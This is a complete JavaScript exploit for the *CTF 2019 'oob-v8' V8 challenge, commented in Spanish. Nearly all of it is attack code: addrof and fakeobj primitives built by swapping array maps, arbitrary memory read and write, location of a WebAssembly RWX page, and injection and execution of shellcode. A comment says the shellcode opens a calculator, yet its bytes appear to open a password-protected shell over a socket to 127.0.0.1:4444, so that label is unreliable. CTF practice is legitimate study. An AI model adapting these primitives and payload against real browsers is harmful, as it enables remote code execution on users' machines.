// *CTF 2019 OOB-V8 Complete Exploit
// Basado exactamente en las notas de ir0nstone
// Exploit completo que obtiene RCE

// Funciones helper para conversión entre float e int
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

console.log("[+] Helper functions cargadas");

// Arrays principales para el exploit
var float_arr = [1.5, 2.5];
var initial_obj = {a: 1}; // placeholder object
var obj_arr = [initial_obj];

console.log("[*] Verificando función .oob()...");

if (typeof float_arr.oob !== 'function') {
    console.log("[-] Función .oob() no disponible - este exploit requiere el patch de *CTF 2019");
    throw new Error("OOB function not available");
}

console.log("[+] Función .oob() encontrada!");

// Obtener maps de los arrays
var map_float = float_arr.oob();
var map_obj = obj_arr.oob();

console.log("[+] Float map: " + map_float);
console.log("[+] Object map: " + map_obj);

// Array para lectura/escritura arbitraria
var arb_rw_arr = [map_float, 1.5, 2.5, 3.5];

// Primitiva addrof - obtener dirección de un objeto
function addrof(obj) {
    obj_arr[0] = obj;           // poner objeto deseado en index 0
    obj_arr.oob(map_float);     // cambiar a float map
    let leak = obj_arr[0];      // leer dirección
    obj_arr.oob(map_obj);       // cambiar de vuelta a object map
    return ftoi(leak);          // retornar leak como integer
}

// Primitiva fakeobj - crear objeto falso desde dirección
function fakeobj(addr) {
    float_arr[0] = itof(addr);  // colocar dirección deseada en index 0
    float_arr.oob(map_obj);     // cambiar a object map
    let fake = float_arr[0];    // obtener objeto falso
    float_arr.oob(map_float);   // cambiar map de vuelta
    return fake;                // retornar objeto
}

console.log("[+] Address of Arbitrary RW Array: 0x" + addrof(arb_rw_arr).toString(16));

// Lectura arbitraria
function arb_read(addr) {
    // tag pointer
    if (addr % 2n == 0) addr += 1n;
    
    // colocar objeto falso sobre el elements FixedDoubleArray del array válido
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    
    // sobrescribir campo 'elements' del array falso con la dirección
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    
    // index 0 retornará el valor de lectura arbitraria
    return ftoi(fake[0]);
}

// Escritura arbitraria inicial (puede fallar con ciertas direcciones)
function initial_arb_write(addr, val) {
    // colocar objeto falso y cambiar elements, como antes
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    
    // Escribir al index 0
    fake[0] = itof(BigInt(val));
}

// Escritura arbitraria usando ArrayBuffer backing pointers (más confiable)
function arb_write(addr, val) {
    // configurar ArrayBuffer y DataView objects
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    
    // escribir dirección al backing store
    initial_arb_write(backing_store_addr, addr);
    
    // escribir datos al offset 0, con little endian true
    dataview.setBigUint64(0, BigInt(val), true);
}

console.log("[+] Primitivas de lectura/escritura arbitraria configuradas");

// WASM para crear página RWX
console.log("[*] Creando instancia WASM...");

var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,
    4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
    7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,
    138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("[+] WASM Instance at 0x" + addrof(wasm_instance).toString(16));

// Encontrar región RWX
// El offset exacto puede variar, pero típicamente está alrededor de 0x68
let wasm_addr = addrof(wasm_instance);
let rwx_ptr_addr = wasm_addr + 0x68n;
let rwx_base = arb_read(rwx_ptr_addr);

console.log("[+] RWX Region located at 0x" + rwx_base.toString(16));

// Shellcode para ejecutar calculadora (desde el writeup original)
var shellcode = [
    0x6a58296a, 0x016a5f02, 0x050f995e, 0x68525f50,
    0x0100007f, 0x5c116866, 0x6a026a66, 0x5e54582a,
    0x0f5a106a, 0x5e026a05, 0x0f58216a, 0xceff4805,
    0x016af679, 0x50b94958, 0x77737361, 0x41203a64,
    0x6a5e5451, 0x050f5a08, 0x48c03148, 0x0f08c683,
    0x31b84805, 0x35343332, 0x56383736, 0x75af485f,
    0x583b6a1a, 0xbb485299, 0x6e69622f, 0x68732f2f,
    0x525f5453, 0x54575a54, 0x90050f5e
];

// Función para copiar shellcode a la región RWX
function copy_shellcode(rwx_addr, shellcode) {
    console.log("[*] Copiando shellcode...");
    
    // crear buffer de 0x100 bytes
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    
    // sobrescribir el backing store para que los 0x100 bytes puedan escribirse donde queremos
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    arb_write(backing_store_addr, rwx_addr);
    
    // escribir el shellcode 4 bytes a la vez
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
    
    console.log("[+] Shellcode copiado exitosamente");
}

// Ejecutar el exploit completo
console.log("[*] Iniciando exploit completo...");

try {
    // Copiar shellcode a región RWX
    copy_shellcode(rwx_base, shellcode);
    
    console.log("[+] Ejecutando shellcode...");
    
    // Ejecutar función WASM (que ahora contiene nuestro shellcode)
    f();
    
    console.log("[+] ¡Exploit ejecutado exitosamente!");
    
} catch(e) {
    console.log("[-] Error ejecutando exploit: " + e);
    console.log("[-] Stack trace: " + e.stack);
}